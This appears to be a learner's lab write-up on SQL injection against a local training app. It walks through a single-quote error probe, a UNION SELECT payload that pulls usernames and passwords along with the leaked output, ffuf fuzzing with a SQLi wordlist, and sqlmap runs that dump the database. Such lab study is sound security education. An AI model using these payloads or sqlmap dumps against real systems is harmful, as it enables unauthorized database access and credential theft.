
---

# 📖 High-Level Summary:

This lab demonstrates multiple techniques to perform SQL Injection (SQLi) attacks on a vulnerable application. The focus is on:

1. Identifying SQLi vulnerabilities using **basic error-based techniques**.
2. Extracting data through **Union Select attacks**.
3. Automating SQLi discovery using **ffuf** and **sqlmap**.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**SQL Injection (SQLi)**|A web vulnerability that allows attackers to interfere with an application’s database queries.|Exploits improperly sanitized inputs to execute arbitrary SQL commands.|
|**Union Select Attack**|A technique to combine results from multiple SELECT statements into a single result.|The number and order of columns in the UNION statement must match the original query.|
|**ffuf**|A web fuzzer for testing and discovering vulnerabilities.|Used here with SQL payloads to identify injectable parameters.|
|**sqlmap**|An automated tool for discovering and exploiting SQL Injection vulnerabilities.|Can detect, exploit, and dump database contents.|
|**`--ignore-code` flag**|Tells sqlmap to ignore specific HTTP response codes.|Used to bypass 401 (Unauthorized) responses in this lab.|

---

# 🎯 Steps and Commands:

### Step 1: Identifying SQL Injection via Error Messages

1. Start by sending a simple payload:
    
    ```plaintext
    '
    ```
    
2. Observe the response in Burp Suite for the request:
    
    ```plaintext
    GET /v1/001.php?roast=5'
    ```
    
    - **Output:**
        
        ```plaintext
        uncaughtmysqli_sql_exception:...
        ```
        
    - **Key Findings:**
        - The application uses **MySQL** as its database.
        - The parameter `roast` is vulnerable to SQL Injection.

---

### Step 2: Extracting Data Using Union Select

1. **Analyze the Base Response**:
    
    ```json
    {
      "ID": 1,
      "name": "Ethiopian Yirgacheffe",
      "origin": "Ethiopia",
      "roast_level": 5
    }
    ```
    
    - There are **4 columns** in the query.
2. **Craft the Union Select Payload**:
    
    ```sql
    5 UNION SELECT username, password, null, null FROM users
    ```
    
    - **Why Does Column Order Matter?**
        - The `ID` and `name` columns in the response correlate to the **first two columns** of the Union Select statement. Placing `username` and `password` in the correct order ensures they appear in the expected fields.
3. **Send the Request in Repeater**:
    
    - Encode the payload and send the following request:
        
        ```plaintext
        GET /v1/001.php?roast=5%20UNION%20SELECT%20username,%20password,%20null,%20null%20FROM%20users
        ```
        
    - **Response:**
        
        ```json
        {
          "ID": "admin",
          "name": "iLikePasta"
        },
        {
          "ID": "jeremy",
          "name": "jeremymyspassword"
        }
        ```
        

---

### Step 3: Using ffuf to Identify SQLi

1. Use the following **ffuf** command:
    
    ```bash
    ffuf -u http://localhost/v1/001.php?roast=FUZZ -w /usr/share/seclists/Fuzzing/SQLi/Generic-Sqli.txt
    ```
    
2. **Flags Used:**
    
    - `-u`: Specifies the target URL with `FUZZ` as the placeholder.
    - `-w`: Points to the wordlist containing SQLi payloads.
3. **Analyze Output:**
    
    - Look for status codes or response sizes that deviate from the baseline.
    - Test the promising payloads in Repeater to confirm injection.

---

### Step 4: Automating SQLi Detection with sqlmap

1. Save the vulnerable request to a file (`req.txt`).
    
2. Run sqlmap:
    
    ```bash
    sqlmap -r req.txt --ignore-code 401
    ```
    
    - **Flags Used:**
        - `-r`: Reads the request from the specified file.
        - `--ignore-code 401`: Bypasses 401 Unauthorized responses.
3. **Key Outputs:**
    
    - sqlmap confirms that the `roast` parameter is injectable.
    - Identifies the **DBMS** as MySQL.
    - Suggests successful payloads for the injection.
4. **Dump Database Contents:**
    
    ```bash
    sqlmap -r req.txt --dump
    ```
    
    - Retrieves tables, columns, and data from the database.

---

# ✅ Key Takeaways:

1. **Error-Based SQLi:** Testing with a single quote (`'`) reveals error messages that confirm injection points.
2. **Union Select:** The number and order of columns must match the original query structure to extract meaningful data.
3. **Automation Tools:** Tools like **ffuf** and **sqlmap** streamline vulnerability discovery and exploitation.

---
